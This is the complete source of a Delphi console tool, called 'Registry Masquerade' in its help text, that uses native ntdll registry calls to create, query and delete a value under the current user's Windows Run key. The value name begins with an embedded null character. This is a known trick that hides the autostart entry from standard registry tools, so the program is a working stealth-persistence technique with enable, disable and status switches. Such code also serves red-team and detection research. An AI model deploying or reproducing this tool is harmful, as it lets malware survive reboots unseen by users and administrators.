program drm;
{$APPTYPE CONSOLE}
{$R *.res}

uses
  Windows,
  System.SysUtils,
  System.Classes,
  GetSid in 'GetSid.pas';

const
  KEY_ALL_ACCESS = $F003F;
  REG_SZ = 1;
  STATUS_SUCCESS = 0;

type
  UNICODE_STRING = record
    Length: Word;
    MaximumLength: Word;
    Buffer: PWideChar;
  end;

  PUNICODE_STRING = ^UNICODE_STRING;
  NTSTATUS = LongInt;

const
  OBJ_CASE_INSENSITIVE = $00000040;

type
  POBJECT_ATTRIBUTES = ^OBJECT_ATTRIBUTES;

  OBJECT_ATTRIBUTES = record
    Length: ULONG;
    RootDirectory: THandle;
    ObjectName: PUNICODE_STRING;
    Attributes: ULONG;
    SecurityDescriptor: Pointer;
    SecurityQualityOfService: Pointer;
  end;

function NtQueryValueKey(KeyHandle: THandle; ValueName: PUNICODE_STRING;
  KeyValueInformationClass: DWORD; KeyValueInformation: Pointer; Length: ULONG;
  ResultLength: PULONG): NTSTATUS; stdcall; external 'ntdll.dll';

function NtCreateKey(var KeyHandle: THandle; DesiredAccess: DWORD;
  ObjectAttributes: Pointer; TitleIndex: ULONG; Class_: PUNICODE_STRING;
  CreateOptions: ULONG; var Disposition: ULONG): NTSTATUS; stdcall;
  external 'ntdll.dll';

function NtSetValueKey(KeyHandle: THandle; ValueName: PUNICODE_STRING;
  TitleIndex: ULONG; Type_: ULONG; Data: Pointer; DataSize: ULONG): NTSTATUS;
  stdcall; external 'ntdll.dll';

function NtDeleteValueKey(KeyHandle: THandle; ValueName: PUNICODE_STRING)
  : NTSTATUS; stdcall; external 'ntdll.dll';

procedure RtlInitUnicodeString(var DestinationString: UNICODE_STRING;
  SourceString: PWideChar); stdcall; external 'ntdll.dll';

function NT_SUCCESS(Status: NTSTATUS): Boolean;
begin
  Result := Status >= 0;
end;

function SetValueWithNullChar(const Path, Name, Command: string): Boolean;
var
  KeyHandle: THandle;
  ObjAttr: OBJECT_ATTRIBUTES;
  KeyStr, ValueStr: UNICODE_STRING;
  RootPath: string;
  Disposition: ULONG;
  NameWithNull: PWideChar;
  Status: NTSTATUS;
  ValueNameBuffer: array [0 .. 31] of WideChar;
begin
  Result := False;
  Writeln('Setting registry value with null char...');
  RootPath := '\Registry\User\' + GetCurrentUserSID + '\' + Path;
  Writeln('Registry path: ' + RootPath);

  RtlInitUnicodeString(KeyStr, PWideChar(RootPath));
  with ObjAttr do
  begin
    Length := SizeOf(OBJECT_ATTRIBUTES);
    RootDirectory := 0;
    ObjectName := @KeyStr;
    Attributes := OBJ_CASE_INSENSITIVE;
    SecurityDescriptor := nil;
    SecurityQualityOfService := nil;
  end;

  Status := NtCreateKey(KeyHandle, KEY_ALL_ACCESS, @ObjAttr, 0, nil, 0,
    Disposition);
  Writeln('NtCreateKey Status: ' + IntToStr(Status));

  if NT_SUCCESS(Status) then
  begin
    Writeln('Key created/opened successfully');
    try
      ValueNameBuffer[0] := #0;
      Move(PWideChar(Name)^, ValueNameBuffer[1],
        Length(Name) * SizeOf(WideChar));
      ValueNameBuffer[Length(Name) + 1] := #0;

      ValueStr.Length := (Length(Name) + 1) * SizeOf(WideChar);
      ValueStr.MaximumLength := ValueStr.Length + SizeOf(WideChar);
      ValueStr.Buffer := @ValueNameBuffer[0];

      Status := NtSetValueKey(KeyHandle, @ValueStr, 0, REG_SZ,
        PWideChar(Command), (Length(Command) + 1) * SizeOf(WideChar));

      Result := NT_SUCCESS(Status);
      if Result then
        Writeln('Registry value set successfully with command: ' + Command)
      else
        Writeln('Failed to set registry value. Status: ' + IntToStr(Status));
    finally
      CloseHandle(KeyHandle);
    end;
  end
  else
    Writeln('Failed to create/open key. Status: ' + IntToStr(Status));
end;

function RemoveRegistryValue(const Path, Name: string): Boolean;
var
  KeyHandle: THandle;
  ObjAttr: OBJECT_ATTRIBUTES;
  KeyStr, ValueStr: UNICODE_STRING;
  RootPath: string;
  Disposition: ULONG;
  Status: NTSTATUS;
  ValueNameBuffer: array [0 .. 31] of WideChar;
begin
  Result := False;
  RootPath := '\Registry\User\' + GetCurrentUserSID + '\' + Path;

  RtlInitUnicodeString(KeyStr, PWideChar(RootPath));
  with ObjAttr do
  begin
    Length := SizeOf(OBJECT_ATTRIBUTES);
    RootDirectory := 0;
    ObjectName := @KeyStr;
    Attributes := OBJ_CASE_INSENSITIVE;
    SecurityDescriptor := nil;
    SecurityQualityOfService := nil;
  end;

  Status := NtCreateKey(KeyHandle, KEY_ALL_ACCESS, @ObjAttr, 0, nil, 0,
    Disposition);

  if NT_SUCCESS(Status) then
  begin
    try
      ValueNameBuffer[0] := #0;
      Move(PWideChar(Name)^, ValueNameBuffer[1],
        Length(Name) * SizeOf(WideChar));
      ValueNameBuffer[Length(Name) + 1] := #0;

      ValueStr.Length := (Length(Name) + 1) * SizeOf(WideChar);
      ValueStr.MaximumLength := ValueStr.Length + SizeOf(WideChar);
      ValueStr.Buffer := @ValueNameBuffer[0];

      Status := NtDeleteValueKey(KeyHandle, @ValueStr);
      Result := NT_SUCCESS(Status);

      if Result then
        Writeln('Registry value removed successfully')
      else
        Writeln('Failed to remove registry value. Status: ' + IntToStr(Status));
    finally
      CloseHandle(KeyHandle);
    end;
  end
  else
    Writeln('Failed to open key for removal. Status: ' + IntToStr(Status));
end;

function CheckRegistryValue(const Path, Name: string): Boolean;
var
  KeyHandle: THandle;
  ObjAttr: OBJECT_ATTRIBUTES;
  KeyStr, ValueStr: UNICODE_STRING;
  RootPath: string;
  Disposition: ULONG;
  Status: NTSTATUS;
  ValueNameBuffer: array[0..31] of WideChar;
  Buffer: array[0..1023] of Byte;
  ResultLength: ULONG;
begin
  Result := False;
  RootPath := '\Registry\User\' + GetCurrentUserSID + '\' + Path;

  RtlInitUnicodeString(KeyStr, PWideChar(RootPath));
  with ObjAttr do
  begin
    Length := SizeOf(OBJECT_ATTRIBUTES);
    RootDirectory := 0;
    ObjectName := @KeyStr;
    Attributes := OBJ_CASE_INSENSITIVE;
    SecurityDescriptor := nil;
    SecurityQualityOfService := nil;
  end;

  Status := NtCreateKey(KeyHandle, KEY_ALL_ACCESS, @ObjAttr, 0, nil, 0, Disposition);

  if NT_SUCCESS(Status) then
  begin
    try
      // Create proper null-embedded value name
      ValueNameBuffer[0] := #0;  // Embedded null
      Move(PWideChar(Name)^, ValueNameBuffer[1], Length(Name) * SizeOf(WideChar));
      ValueNameBuffer[Length(Name) + 1] := #0;  // Terminating null

      ValueStr.Length := (Length(Name) + 1) * SizeOf(WideChar);
      ValueStr.MaximumLength := ValueStr.Length + SizeOf(WideChar);
      ValueStr.Buffer := @ValueNameBuffer[0];

      Status := NtQueryValueKey(
        KeyHandle,
        @ValueStr,
        0,  // KeyValueBasicInformation
        @Buffer,
        SizeOf(Buffer),
        @ResultLength
      );

      Result := NT_SUCCESS(Status);

      if Result then
        Writeln('Registry value exists and was successfully queried')
      else
        Writeln('Registry value not found or error occurred. Status: ' + IntToStr(Status));
    finally
      CloseHandle(KeyHandle);
    end;
  end
  else
    Writeln('Failed to open key for query. Status: ' + IntToStr(Status));
end;

procedure ShowHelp;
begin
  Writeln('Registry Masquerade Usage:');
  Writeln('  -enable -command "<command_path>" : Enable startup entry');
  Writeln('  -disable                          : Disable startup entry');
  Writeln('  -status                           : Show current status');
  Writeln('  -help                             : Show this help message');
  Writeln;
  Writeln('Examples:');
  Writeln('  ' + ExtractFileName(ParamStr(0)) +
    ' -enable -command "C:\Windows\System32\notepad.exe"');
  Writeln('  ' + ExtractFileName(ParamStr(0)) + ' -disable');
  Writeln('  ' + ExtractFileName(ParamStr(0)) + ' -status');
end;

function ParseCommandLine: Boolean;
var
  i: Integer;
  Command: string;
  RegistryPath: string;
begin
  Result := False;
  Command := '';
  RegistryPath := 'Software\Microsoft\Windows\CurrentVersion\Run';

  if ParamCount = 0 then
  begin
    ShowHelp;
    Exit;
  end;

  i := 1;
  while i <= ParamCount do
  begin
    if ParamStr(i) = '-help' then
    begin
      ShowHelp;
      Result := True;
      Exit;
    end
    else if ParamStr(i) = '-enable' then
    begin
      Inc(i);
      while i <= ParamCount do
      begin
        if ParamStr(i) = '-command' then
        begin
          if i < ParamCount then
          begin
            Command := ParamStr(i + 1);
            if FileExists(Command.Replace('"', '')) then
            begin
              Result := SetValueWithNullChar(RegistryPath, 'X', Command);
              Exit;
            end
            else
            begin
              Writeln('Error: Specified command path does not exist: '
                + Command);
              Exit;
            end;
          end
          else
          begin
            Writeln('Error: -command parameter requires a path argument');
            Exit;
          end;
        end;
        Inc(i);
      end;
    end
    else if ParamStr(i) = '-disable' then
    begin
      Result := RemoveRegistryValue(RegistryPath, 'X');
      Exit;
    end
    else if ParamStr(i) = '-status' then
    begin
      if CheckRegistryValue(RegistryPath, 'X') then
        Writeln('Registry entry is currently enabled.')
      else
        Writeln('Registry entry is currently disabled.');
      Result := True;
      Exit;
    end;
    Inc(i);
  end;

  if not Result then
  begin
    Writeln('Invalid parameters.');
    ShowHelp;
  end;
end;

begin
  try
    if not ParseCommandLine then
      ExitCode := 1
    else
      ExitCode := 0;
  except
    on E: Exception do
    begin
      Writeln(E.ClassName, ': ', E.Message);
      ExitCode := 1;
    end;
  end;

end.
